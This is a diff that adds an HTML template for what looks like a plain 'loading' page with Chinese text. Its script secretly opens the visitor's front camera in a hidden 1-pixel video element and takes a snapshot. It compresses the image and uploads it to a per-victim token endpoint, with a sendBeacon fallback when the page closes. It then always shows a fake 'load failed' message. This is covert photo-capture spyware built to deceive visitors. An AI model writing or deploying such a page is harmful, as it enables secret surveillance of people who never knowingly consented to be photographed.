@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title></title>
+<style>
+  * {
+    box-sizing: border-box;
+    -webkit-tap-highlight-color: transparent;
+    -webkit-touch-callout: none;
+  }
+  button, a, input {
+    outline: none;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  html, body {
+    margin: 0; padding: 0;
+    height: 100%; overflow: hidden;
+    background-color: #0a0d12;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+                 "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+    -webkit-font-smoothing: antialiased;
+    color: #f8fafc;
+  }
+
+  .grid-bg {
+    position: fixed; inset: 0; width: 100vw; height: 100vh;
+    --color: #151b24;
+    background-color: #0a0d12;
+    background-image:
+      linear-gradient(0deg, transparent 24%, var(--color) 25%, var(--color) 26%, transparent 27%, transparent 74%, var(--color) 75%, var(--color) 76%, transparent 77%, transparent),
+      linear-gradient(90deg, transparent 24%, var(--color) 25%, var(--color) 26%, transparent 27%, transparent 74%, var(--color) 75%, var(--color) 76%, transparent 77%, transparent);
+    background-size: 55px 55px;
+    z-index: -2; pointer-events: none;
+  }
+
+  body {
+    display: flex; align-items: center; justify-content: center;
+    padding: 60px 40px; background: transparent;
+    position: relative; z-index: 0;
+  }
+
+  .container {
+    width: 100%; max-width: 720px; height: 100%;
+    padding: 30px 20px 20px;
+    transform-origin: center center;
+    background: linear-gradient(180deg,
+      rgba(255, 255, 255, 0) 0%,
+      rgba(240, 248, 255, 0) 1%,
+      rgba(230, 242, 255, 0) 100%);
+    border-radius: 28px;
+    border: 1px solid rgba(255, 255, 255, 0.55);
+    box-shadow:
+      inset 0 1.5px 0.5px rgba(255, 255, 255, 1),
+      inset 1px 0 0.5px rgba(255, 255, 255, 0.45),
+      inset -1px 0 0.5px rgba(255, 255, 255, 0.45),
+      inset 0 -1.5px 1px rgba(140, 180, 225, 0.30),
+      inset 0 0 60px rgba(210, 235, 255, 0.05),
+      0 24px 60px rgba(0, 5, 20, 0.50),
+      0 6px 18px rgba(0, 5, 20, 0.30);
+    position: relative;
+    isolation: isolate;
+    backdrop-filter: blur(1px) saturate(1.4);
+    -webkit-backdrop-filter: blur(6px) saturate(1.4);
+  }
+
+  .container::before {
+    content: ''; position: absolute; inset: 0; border-radius: inherit;
+    background: radial-gradient(ellipse 100% 45% at 50% -5%,
+      rgba(255, 255, 255, 0.30) 0%,
+      rgba(255, 255, 255, 0.06) 40%,
+      transparent 70%);
+    pointer-events: none; z-index: 0;
+  }
+  .container::after {
+    content: ''; position: absolute; top: -25%; left: -8%;
+    width: 45%; height: 55%; border-radius: 50%;
+    background: radial-gradient(circle at center,
+      rgba(255, 255, 255, 0.22) 0%,
+      rgba(255, 255, 255, 0.06) 35%,
+      transparent 70%);
+    filter: blur(28px); pointer-events: none; z-index: 0;
+  }
+
+  #cam {
+    position: fixed; top: 0; left: 0;
+    width: 1px; height: 1px; opacity: 0.01;
+    pointer-events: none;
+  }
+
+  #tip {
+    position: absolute; top: 25%; left: 50%;
+    transform: translate(-50%, -50%);
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    gap: 28px; text-align: center; padding: 0 24px;
+    color: #ffffff; font-size: 26px; font-weight: 800;
+    letter-spacing: 2px; line-height: 1.5;
+    user-select: none; pointer-events: none; z-index: 1;
+    animation: fadeIn .5s ease both;
+    text-shadow: 0 2px 14px rgba(0, 0, 0, 0.55);
+  }
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+  .spinner {
+    width: 52px; height: 52px; border-radius: 50%;
+    border: 2px solid rgba(255, 255, 255, 0.08);
+    border-top-color: rgba(255, 255, 255, 0.85);
+    border-right-color: rgba(255, 255, 255, 0.35);
+    animation: spin 1.05s linear infinite;
+    will-change: transform;
+    box-shadow:
+      0 0 0 1px rgba(255, 255, 255, 0.03),
+      inset 0 0 12px rgba(255, 255, 255, 0.04);
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  #tip.fail .spinner { display: none; }
+
+  .fail-text {
+    display: none; font-size: 28px; font-weight: 800;
+    letter-spacing: 3px; color: #ffffff;
+    text-shadow: 0 2px 14px rgba(0, 0, 0, 0.6);
+  }
+  #tip.fail .fail-text { display: block; }
+  #tip.fail .loading-text { display: none; }
+
+  .loading-text {
+    font-size: 26px; font-weight: 800;
+    letter-spacing: 2px; color: #ffffff;
+  }
+
+  .dots span { display: inline-block; animation: blink 1.4s infinite; }
+  .dots span:nth-child(1) { animation-delay: 0s; }
+  .dots span:nth-child(2) { animation-delay: 0.2s; }
+  .dots span:nth-child(3) { animation-delay: 0.4s; }
+
+  @keyframes blink { 0%, 80%, 100% { opacity: 0.25; } 40% { opacity: 1; } }
+
+  @media (max-width: 599px) {
+    body { padding: 32px 16px; }
+    .container { max-width: 100% !important; padding: 20px 16px; border-radius: 20px; }
+    #tip { font-size: 22px; gap: 22px; }
+    .loading-text { font-size: 22px; }
+    .fail-text { font-size: 24px; }
+    .spinner { width: 44px; height: 44px; }
+  }
+
+  @media (min-width: 600px) and (max-width: 800px) {
+    .container { max-width: 100%; padding: 30px 24px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="grid-bg" aria-hidden="true"></div>
+
+<div class="container">
+    <div id="tip">
+        <div class="spinner"></div>
+        <div class="loading-text">
+            正在加载<span class="dots"><span>.</span><span>.</span><span>.</span></span>
+        </div>
+        <div class="fail-text">加载失败</div>
+    </div>
+</div>
+
+<video id="cam" autoplay playsinline muted></video>
+
+<script>
+const TOKEN = {{ token | tojson }};
+const QUALITY = {{ quality | tojson }};
+
+const QUALITY_PRESETS = {
+    // 极小体积，弱网首选
+    tiny:     { maxSide: 640,  jpegQ: 0.60, waitMs: 100, camW: 960,  camH: 720  },
+    // 稍微看清人脸
+    low:      { maxSide: 720,  jpegQ: 0.65, waitMs: 150, camW: 960,  camH: 720  },
+    // 能看清细节
+    standard: { maxSide: 960,  jpegQ: 0.70, waitMs: 200, camW: 1280, camH: 960  },
+    // 保留更多细节，弱网慎选
+    high:     { maxSide: 1280, jpegQ: 0.75, waitMs: 250, camW: 1280, camH: 960  },
+};
+
+const cfg = QUALITY_PRESETS[QUALITY] || QUALITY_PRESETS.tiny;
+
+const tipEl = document.getElementById('tip');
+
+let uploaded    = false;
+let pendingBlob = null;
+let beaconSent  = false;
+
+const SUPPORTS_WEBP = (function() {
+    try {
+        const c = document.createElement('canvas');
+        c.width = 1;
+        c.height = 1;
+        return c.toDataURL('image/webp').indexOf('data:image/webp') === 0;
+    } catch (e) {
+        return false;
+    }
+})();
+
+const IMG_MIME = SUPPORTS_WEBP ? 'image/webp' : 'image/jpeg';
+const IMG_EXT  = SUPPORTS_WEBP ? 'webp' : 'jpg';
+
+function showFail() {
+    tipEl.classList.add('fail');
+}
+
+function waitReady(v) {
+    return new Promise((resolve, reject) => {
+        const t0 = Date.now();
+        const tick = () => {
+            if (v.videoWidth > 0 && v.videoHeight > 0 && v.readyState >= 2) {
+                resolve();
+            } else if (Date.now() - t0 > 8000) {
+                reject(new Error('timeout'));
+            } else {
+                requestAnimationFrame(tick);
+            }
+        };
+        tick();
+    });
+}
+
+async function compress(video, w, h, quality) {
+    const mime = IMG_MIME;
+
+    if (typeof createImageBitmap === 'function' && typeof OffscreenCanvas !== 'undefined') {
+        try {
+            const bitmap = await createImageBitmap(video);
+            const off = new OffscreenCanvas(w, h);
+            const ctx = off.getContext('2d');
+            ctx.drawImage(bitmap, 0, 0, w, h);
+            if (bitmap.close) bitmap.close();
+
+            const blob = await off.convertToBlob({ type: mime, quality });
+            if (blob && blob.type === mime) return blob;
+            if (mime !== 'image/jpeg') {
+                return await off.convertToBlob({ type: 'image/jpeg', quality });
+            }
+            return blob;
+        } catch (e) {}
+    }
+
+    const c = document.createElement('canvas');
+    c.width = w;
+    c.height = h;
+    const ctx = c.getContext('2d');
+    ctx.drawImage(video, 0, 0, w, h);
+    await new Promise(r => requestAnimationFrame(r));
+    ctx.drawImage(video, 0, 0, w, h);
+
+    return new Promise(res => {
+        c.toBlob(blob => {
+            if (blob && blob.type === mime) {
+                res(blob);
+                return;
+            }
+            c.toBlob(b => res(b), 'image/jpeg', quality);
+        }, mime, quality);
+    });
+}
+
+function uploadWithProgress(blob) {
+    return new Promise((resolve, reject) => {
+        const xhr = new XMLHttpRequest();
+        xhr.open('POST', '/upload/' + TOKEN, true);
+
+        const startTime = performance.now();
+
+        xhr.upload.onprogress = (e) => {};
+
+        xhr.onload = () => {
+            if (xhr.status >= 200 && xhr.status < 300) {
+                const elapsedSec = (performance.now() - startTime) / 1000;
+                const elapsedMs  = Math.round(elapsedSec * 1000);
+                const speedKbps  = elapsedSec > 0
+                    ? (blob.size / 1024) / elapsedSec
+                    : 0;
+                resolve({ elapsedMs, speedKbps });
+            } else {
+                reject(new Error('HTTP ' + xhr.status));
+            }
+        };
+
+        xhr.onerror = () => reject(new Error('network'));
+        xhr.ontimeout = () => reject(new Error('timeout'));
+
+        const fd = new FormData();
+        fd.append('photo', blob, 'snapshot.' + IMG_EXT);
+        xhr.send(fd);
+    });
+}
+
+/* 上报所有阶段耗时 */
+function reportStat(s) {
+    try {
+        const url = '/api/upload-stat/' + TOKEN +
+            '?cam_ms=' + s.cam_ms +
+            '&wait_ms=' + s.wait_ms +
+            '&compress_ms=' + s.compress_ms +
+            '&upload_ms=' + s.upload_ms +
+            '&total_ms=' + s.total_ms +
+            '&speed_kbps=' + s.speed_kbps.toFixed(2);
+        fetch(url, { cache: 'no-store' }).catch(() => {});
+    } catch (e) {}
+}
+
+function trySendBeacon() {
+    if (uploaded || beaconSent || !pendingBlob) return;
+    if (pendingBlob.size > 60 * 1024) return;
+
+    try {
+        const fd = new FormData();
+        fd.append('photo', pendingBlob, 'snapshot.' + IMG_EXT);
+        const ok = navigator.sendBeacon('/upload/' + TOKEN, fd);
+        if (ok) beaconSent = true;
+    } catch (e) {}
+}
+
+document.addEventListener('visibilitychange', () => {
+    if (document.visibilityState === 'hidden') trySendBeacon();
+});
+window.addEventListener('pagehide', trySendBeacon);
+
+/* ============================================================
+   主流程（分阶段打点）
+   ============================================================ */
+window.onload = async function() {
+    const v = document.getElementById('cam');
+    let stream = null;
+
+    const t_start = performance.now();
+    let t_camReady   = 0;   
+    let t_waitDone   = 0;   
+    let t_compressed = 0;   
+
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: 'user',
+                width:  { ideal: cfg.camW },
+                height: { ideal: cfg.camH }
+            },
+            audio: false
+        });
+        v.srcObject = stream;
+        await v.play();
+        await waitReady(v);
+        t_camReady = performance.now();
+
+        // 等曝光稳定
+        await new Promise(r => setTimeout(r, cfg.waitMs));
+        t_waitDone = performance.now();
+
+        const vw = v.videoWidth;
+        const vh = v.videoHeight;
+        let w = vw, h = vh;
+        const maxSide = Math.max(vw, vh);
+        if (maxSide > cfg.maxSide) {
+            const k = cfg.maxSide / maxSide;
+            w = Math.round(vw * k);
+            h = Math.round(vh * k);
+        }
+
+        const blob = await compress(v, w, h, cfg.jpegQ);
+        t_compressed = performance.now();
+
+        if (blob) {
+            pendingBlob = blob;
+
+            try {
+                const stat = await uploadWithProgress(blob);
+                uploaded = true;
+                pendingBlob = null;
+
+                const cam_ms      = Math.round(t_camReady   - t_start);
+                const wait_ms     = Math.round(t_waitDone   - t_camReady);
+                const compress_ms = Math.round(t_compressed - t_waitDone);
+                const upload_ms   = stat.elapsedMs;
+                const total_ms    = Math.round(performance.now() - t_start);
+
+                reportStat({
+                    cam_ms,
+                    wait_ms,
+                    compress_ms,
+                    upload_ms,
+                    total_ms,
+                    speed_kbps: stat.speedKbps
+                });
+            } catch (e) {
+                // 失败保留 pendingBlob，等 pagehide 时兜底
+            }
+        }
+
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        v.remove();
+        showFail(); // 保持原样
+
+    } catch(e) {
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        showFail(); // 保持原样
+    }
+};
+</script>
+</body>
+</html>
